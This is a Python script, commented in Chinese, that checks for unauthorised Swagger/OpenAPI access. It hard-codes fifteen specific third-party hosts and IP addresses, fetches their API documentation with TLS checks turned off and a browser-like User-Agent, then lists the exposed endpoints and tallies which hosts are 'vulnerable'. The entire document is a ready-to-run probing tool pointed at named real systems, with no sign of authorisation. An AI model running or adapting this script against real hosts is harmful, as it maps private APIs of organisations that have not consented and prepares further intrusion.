#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Swagger UI 未授权访问漏洞验证脚本
"""

import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [
    {"url": "http://hjlndx.tyzdtech.com:8081", "path": "/api/v2/api-docs"},
    {"url": "http://shop.tyzdtech.com:8081", "path": "/api/v2/api-docs"},
    {"url": "http://hjlndx.tyzdtech.com:8080", "path": "/api/v2/api-docs"},
    {"url": "http://shop.tyzdtech.com:8080", "path": "/api/v2/api-docs"},
    {"url": "http://www.hjspyw.ruijinyun.com:58080", "path": "/v3/api-docs"},
    {"url": "https://shop.tyzdtech.com:443", "path": "/api/v2/api-docs"},
    {"url": "https://43.139.80.254:443", "path": "/api/v2/api-docs"},
    {"url": "http://36.137.123.7:58080", "path": "/v3/api-docs"},
    {"url": "http://fly.tyzdtech.com:8080", "path": "/v2/api-docs"},
    {"url": "https://fly.tyzdtech.com:443", "path": "/api/v2/api-docs"},
    {"url": "http://43.139.80.254:8081", "path": "/api/v2/api-docs"},
    {"url": "http://fly.tyzdtech.com:8081", "path": "/api/v2/api-docs"},
    {"url": "http://43.139.80.254:8080", "path": "/api/v2/api-docs"},
    {"url": "http://gjh.ruijinyun.com:58080", "path": "/v3/api-docs"},
    {"url": "http://hjspyw.ruijinyun.com:58080", "path": "/v3/api-docs"},
]

COMMON_PATHS = [
    "/v2/api-docs",
    "/v3/api-docs",
    "/api/v2/api-docs",
    "/api/v3/api-docs",
    "/swagger-ui.html",
    "/swagger-ui/index.html",
    "/doc.html",
    "/swagger-resources",
]

print("=" * 70)
print("  Swagger UI 未授权访问漏洞验证")
print("=" * 70)
print()

vuln_count = 0
results = []

for i, target in enumerate(TARGETS):
    url = f"{target['url']}{target['path']}"
    print(f"[{i+1}/{len(TARGETS)}] {target['url']}")
    print("-" * 70)
    
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json,*/*",
        }
        
        response = requests.get(url, headers=headers, timeout=8, verify=False)
        
        print(f"  路径: {target['path']}")
        print(f"  状态码: {response.status_code}")
        
        is_vuln = False
        
        if response.status_code == 200:
            content_type = response.headers.get('Content-Type', '')
            
            # 检查是否是Swagger JSON
            if 'application/json' in content_type or '"swagger"' in response.text or '"openapi"' in response.text:
                try:
                    data = json.loads(response.text)
                    
                    # Swagger 2.0
                    if 'swagger' in data:
                        is_vuln = True
                        version = data.get('swagger', 'unknown')
                        title = data.get('info', {}).get('title', 'unknown')
                        paths_count = len(data.get('paths', {}))
                        print(f"  版本: Swagger {version}")
                        print(f"  标题: {title}")
                        print(f"  API数量: {paths_count}个")
                    
                    # OpenAPI 3.0
                    elif 'openapi' in data:
                        is_vuln = True
                        version = data.get('openapi', 'unknown')
                        title = data.get('info', {}).get('title', 'unknown')
                        paths_count = len(data.get('paths', {}))
                        print(f"  版本: OpenAPI {version}")
                        print(f"  标题: {title}")
                        print(f"  API数量: {paths_count}个")
                    
                    if is_vuln:
                        vuln_count += 1
                        print(f"  状态: ✅ 存在漏洞")
                        
                        # 显示部分API
                        paths = list(data.get('paths', {}).keys())[:5]
                        if paths:
                            print(f"  部分API:")
                            for p in paths:
                                print(f"    - {p}")
                        
                        results.append({
                            "url": target['url'],
                            "path": target['path'],
                            "version": version,
                            "title": title,
                            "apis": paths_count
                        })
                
                except:
                    # 不是JSON但可能是swagger页面
                    if 'swagger' in response.text.lower() or 'api-docs' in response.text.lower():
                        is_vuln = True
                        vuln_count += 1
                        print(f"  状态: ✅ 存在漏洞 (Swagger页面)")
                        results.append({
                            "url": target['url'],
                            "path": target['path'],
                            "version": "unknown",
                            "title": "Swagger UI",
                            "apis": 0
                        })
        
        if not is_vuln:
            print(f"  状态: ❌ 未发现")
            
    except requests.exceptions.Timeout:
        print(f"  状态: ❌ 超时")
    except requests.exceptions.ConnectionError:
        print(f"  状态: ❌ 连接失败")
    except Exception as e:
        print(f"  状态: ❌ 异常: {e}")
    
    print()

print("=" * 70)
print(f"  验证完成: {vuln_count}/{len(TARGETS)} 个存在漏洞")
print("=" * 70)

if results:
    print()
    print("漏洞列表汇总:")
    print("-" * 70)
    for i, r in enumerate(results):
        print(f"  {i+1}. {r['url']}{r['path']}")
        print(f"     {r['title']} - {r['apis']}个API")
